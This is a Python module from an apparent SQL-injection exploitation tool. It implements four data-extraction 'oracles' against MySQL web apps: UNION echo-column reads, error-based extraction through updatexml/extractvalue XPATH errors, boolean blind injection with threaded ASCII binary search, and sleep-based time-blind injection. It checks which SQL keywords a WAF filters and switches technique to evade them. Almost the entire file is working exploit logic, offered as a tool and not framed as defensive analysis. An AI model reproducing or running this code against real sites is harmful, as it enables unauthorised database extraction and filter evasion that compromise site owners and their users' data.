"""四大取数通道（Oracle）：把任意标量 SQL 表达式的值取回来。

- UnionOracle ：回显位直接读值（最快）
- ErrorOracle ：updatexml/extractvalue 报错带回（32 字符分段）
- BoolOracle  ：布尔差异 + ascii 二分（支持按位并发）
- TimeOracle  ：sleep 延时差异 + ascii 二分（最慢，兜底）
"""
from __future__ import annotations

import re
from concurrent.futures import ThreadPoolExecutor, as_completed

from .builder import PayloadBuilder
from .models import InjectionPoint, ResponseInfo, WafReport, similarity
from .session import HttpSession

MARK_L = "~~"          # union 取值包裹标记（0x7e7e）


class OracleError(RuntimeError):
    pass


class BaseOracle:
    name = "base"

    def __init__(self, session: HttpSession, inj: InjectionPoint,
                 builder: PayloadBuilder, waf: WafReport):
        self.s = session
        self.inj = inj
        self.b = builder
        self.waf = waf
        self.requests = 0

    def scalar(self, expr: str) -> str:
        """取回标量表达式的字符串值。"""
        raise NotImplementedError

    def scalar_int(self, expr: str) -> int:
        v = self.scalar(expr).strip()
        m = re.search(r"-?\d+", v)
        if not m:
            raise OracleError(f"非数值结果: {v!r} ({expr})")
        return int(m.group())


# ---------------------------------------------------------------------------
# UNION 回显通道
# ---------------------------------------------------------------------------
class UnionOracle(BaseOracle):
    name = "union"

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        if not self.inj.echo_positions or not self.inj.column_count:
            raise OracleError("缺少回显位/列数信息，UNION 通道不可用")
        if self.waf.is_filtered("concat", "union", "select"):
            raise OracleError("union/select/concat 被过滤")

    def scalar(self, expr: str) -> str:
        n = self.inj.column_count
        pos = self.inj.echo_positions[0] - 1
        cols = ["null"] * n
        cols[pos] = f"concat(0x7e7e,ifnull(({expr}),0x4e554c4c),0x7e7e)"
        payload = self.b.wrap("union select " + ",".join(cols), base_value="0")
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        m = re.search(re.escape(MARK_L) + r"(.*?)" + re.escape(MARK_L), r.body, re.S)
        if not m:
            raise OracleError(f"回显标记未找到（可能列数/回显位变化）: {expr}")
        val = m.group(1)
        return "" if val == "NULL" else val


# ---------------------------------------------------------------------------
# 报错通道
# ---------------------------------------------------------------------------
class ErrorOracle(BaseOracle):
    name = "error"
    CHUNK = 30          # XPATH 报错 32 字符上限

    def __init__(self, *a, **kw):
        super().__init__(*a, **kw)
        if not self.waf.is_filtered("updatexml"):
            self.fn = "updatexml(1,{xpath},1)"
        elif not self.waf.is_filtered("extractvalue"):
            self.fn = "extractvalue(1,{xpath})"
        else:
            raise OracleError("updatexml 与 extractvalue 均被过滤，报错通道不可用")
        if self.waf.is_filtered("concat", "substr"):
            raise OracleError("concat/substr 被过滤，报错通道不可用")

    def _chunk(self, expr: str, start: int) -> str:
        xpath = f"concat(0x7e,substr(({expr}),{start},{self.CHUNK}),0x7e)"
        payload = self.b.wrap("and " + self.fn.format(xpath=xpath))
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        if not r.has_sql_error():
            raise OracleError(f"报错通道未按预期工作: {r.sql_error_text()[:80]}")
        m = re.search(r"XPATH syntax error:\s*'~([^~]*)", r.body, re.S)
        if not m:
            raise OracleError(f"无法从报错中解析数据: {r.sql_error_text()[:80]}")
        return m.group(1)

    def scalar(self, expr: str) -> str:
        out, i = [], 1
        while True:
            chunk = self._chunk(expr, i)
            if not chunk:
                break
            out.append(chunk)
            if len(chunk) < self.CHUNK:
                break
            i += self.CHUNK
        return "".join(out)


# ---------------------------------------------------------------------------
# 布尔盲注通道
# ---------------------------------------------------------------------------
class BoolOracle(BaseOracle):
    name = "bool"

    def __init__(self, *a, workers: int = 6, **kw):
        super().__init__(*a, **kw)
        self.workers = workers
        pre = self.inj.base_value if self.inj.numeric else self.inj.base_value + self.inj.closure
        tail = self.inj.comment if self.inj.comment != "quote-close" else ""
        self.R_true = self.s.request_value(f"{pre} and 1=1{tail}")
        self.R_false = self.s.request_value(f"{pre} and 1=2{tail}")
        if similarity(self.R_true, self.R_false) > 0.995:
            raise OracleError("真假页面无差异，布尔通道不可用")

    def eval_bool(self, cond: str) -> bool:
        payload = self.b.wrap(self.b.logic_and(cond))
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        return similarity(r, self.R_true) >= similarity(r, self.R_false)

    def _binsearch(self, cond_fmt, lo: int, hi: int) -> int:
        """cond_fmt(mid) 单调递减（true→false），返回最后为真的 mid（即真实值）。"""
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.s.stopped:
                raise OracleError("用户中止")
            if self.eval_bool(cond_fmt(mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def _char_at(self, expr: str, pos: int) -> str:
        code = self._binsearch(
            lambda m: f"ascii(substr(({expr}),{pos},1))>={m}", 32, 126)
        return chr(code)

    def scalar(self, expr: str) -> str:
        if self.waf.is_filtered("ascii", "ord", "substr", "mid"):
            raise OracleError("ascii/substr 被过滤，布尔通道不可用")
        if not self.eval_bool(f"length(({expr}))>0"):
            return ""
        length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 1024)
        self.s.log("INFO", f"[bool] 长度={length}，开始逐字符提取: {expr[:60]}")
        result = [""] * length
        with ThreadPoolExecutor(max_workers=self.workers) as ex:
            futs = {ex.submit(self._char_at, expr, p + 1): p for p in range(length)}
            for f in as_completed(futs):
                result[futs[f]] = f.result()
        return "".join(result)


# ---------------------------------------------------------------------------
# 时间盲注通道
# ---------------------------------------------------------------------------
class TimeOracle(BaseOracle):
    name = "time"
    THRESHOLD_MS = 1800

    def __init__(self, *a, delay: float = 2.0, **kw):
        super().__init__(*a, **kw)
        self.delay = delay
        if self.waf.is_filtered("sleep"):
            raise OracleError("sleep 被过滤，时间通道不可用")
        if self.waf.is_filtered("if") and self.waf.is_filtered("and"):
            raise OracleError("if 与 and 均被过滤，时间通道不可用")

    def eval_bool(self, cond: str) -> bool:
        if not self.waf.is_filtered("if"):
            core = f"if(({cond}),sleep({self.delay}),0)"
        else:
            core = f"sleep({self.delay}*({cond}))"
        payload = self.b.wrap(self.b.logic_and(core))
        r = self.s.request_value(payload)
        self.requests += 1
        if r.status_code < 0:
            raise OracleError("请求失败")
        return r.elapsed_ms >= self.delay * 1000 * 0.75

    def _binsearch(self, cond_fmt, lo, hi):
        while lo < hi:
            mid = (lo + hi + 1) // 2
            if self.s.stopped:
                raise OracleError("用户中止")
            if self.eval_bool(cond_fmt(mid)):
                lo = mid
            else:
                hi = mid - 1
        return lo

    def scalar(self, expr: str) -> str:
        if self.waf.is_filtered("ascii", "ord", "substr", "mid"):
            raise OracleError("ascii/substr 被过滤，时间通道不可用")
        if not self.eval_bool(f"length(({expr}))>0"):
            return ""
        length = self._binsearch(lambda m: f"length(({expr}))>={m}", 1, 512)
        self.s.log("INFO", f"[time] 长度={length}，逐字符提取（每字符约 7 次请求）: {expr[:60]}")
        out = []
        for p in range(1, length + 1):
            code = self._binsearch(lambda m: f"ascii(substr(({expr}),{p},1))>={m}", 32, 126)
            out.append(chr(code))
            if self.s.stopped:
                raise OracleError("用户中止")
        return "".join(out)
